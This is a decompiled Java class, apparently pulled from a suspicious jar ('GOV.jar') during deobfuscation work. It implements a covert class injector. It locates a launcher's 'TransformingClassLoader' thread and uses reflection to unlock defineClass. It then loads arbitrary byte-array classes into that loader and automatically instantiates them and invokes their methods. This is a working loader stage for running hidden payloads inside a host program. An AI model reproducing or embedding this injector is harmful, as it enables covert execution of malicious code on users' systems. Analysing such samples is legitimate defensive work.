import java.lang.reflect.Method;
import java.security.ProtectionDomain;
import java.util.ArrayList;

public class MagicTheInjecting extends Thread {
  public static byte[][] Field3;
  
  private static Class Method17(ClassLoader paramClassLoader, String... paramVarArgs) {
    String[] arrayOfString = paramVarArgs;
    int i = arrayOfString.length;
    byte b = 0;
    if (b < i) {
      String str = arrayOfString[b];
      return paramClassLoader.loadClass(str);
    } 
    return null;
  }
  
  public void Method18() {
    ClassLoader classLoader = null;
    for (Thread thread : Thread.getAllStackTraces().keySet()) {
      ClassLoader classLoader1;
      if (thread == null || thread.getContextClassLoader() == null || (classLoader1 = thread.getContextClassLoader()).getClass() == null || classLoader1.getClass().getName() == null)
        continue; 
      String str = classLoader1.getClass().getName();
      if (!str.contains("TransformingClassLoader"))
        continue; 
      classLoader = classLoader1;
    } 
    if (classLoader == null)
      return; 
    setContextClassLoader(classLoader);
    Method method = ClassLoader.class.getDeclaredMethod("defineClass", new Class[] { String.class, byte[].class, int.class, int.class, ProtectionDomain.class });
    method.setAccessible(true);
    ArrayList<Object[]> arrayList = new ArrayList();
    for (byte[] arrayOfByte : Field3) {
      if (arrayOfByte == null)
        return; 
      Class<Exception> clazz = (Class)method.invoke(classLoader, new Object[] { null, arrayOfByte, Integer.valueOf(0), Integer.valueOf(arrayOfByte.length), classLoader.getClass().getProtectionDomain() });
      if (clazz.getSuperclass() == Exception.class) {
        Object[] arrayOfObject = new Object[3];
        arrayOfObject[0] = clazz;
        ArrayList arrayList1 = new ArrayList();
        ArrayList<Method> arrayList2 = new ArrayList();
        for (Method method1 : clazz.getDeclaredMethods()) {
          if (method1.getParameterCount() == 1 && method1.getParameterTypes()[0] == String.class) {
            method1.setAccessible(true);
            arrayList2.add(method1);
          } 
        } 
        arrayOfObject[1] = arrayList1;
        arrayOfObject[2] = arrayList2;
        arrayList.add(arrayOfObject);
      } 
    } 
    for (Object[] arrayOfObject : arrayList) {
      Class<Object> clazz = (Class)arrayOfObject[0];
      ArrayList arrayList1 = (ArrayList)arrayOfObject[2];
      Object object = null;
      object = clazz.newInstance();
      for (Method method1 : arrayList1) {
        method1.invoke(object, new Object[] { null });
      } 
    } 
  }
  
  public static int Method19(byte[][] paramArrayOfbyte) {
    Field3 = paramArrayOfbyte;
    MagicTheInjecting magicTheInjecting = new MagicTheInjecting();
    magicTheInjecting.start();
    return 0;
  }
  
  public static byte[][] Method20(int paramInt) {
    return new byte[paramInt][];
  }
}


/* Location:              D:\Deobfuscator-master\test\deobf2\GOV.jar!\Class25.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */